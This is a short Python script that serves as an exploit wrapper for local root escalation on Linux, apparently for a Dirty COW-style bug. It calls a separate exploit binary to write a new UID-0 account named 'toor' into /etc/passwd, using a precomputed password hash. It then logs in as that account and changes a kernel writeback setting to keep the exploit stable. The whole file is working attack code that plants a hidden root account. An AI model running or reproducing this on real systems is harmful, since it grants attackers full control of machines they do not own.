#!/usr/bin/python

import subprocess
import os

user = 'toor'

# https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow 
# perl -e 'print crypt("foo", "aa")'
hashed_password = 'aaKNIEDOaueR6'

subprocess.call(['./exploit', '/etc/passwd', '{0}:{1}:0:0:root:/root:/bin/bash\n'.format(user, hashed_password)])

# disable to make exploit stable
os.system('su -l {} -c "echo 0 > /proc/sys/vm/dirty_writeback_centisecs"'.format(user))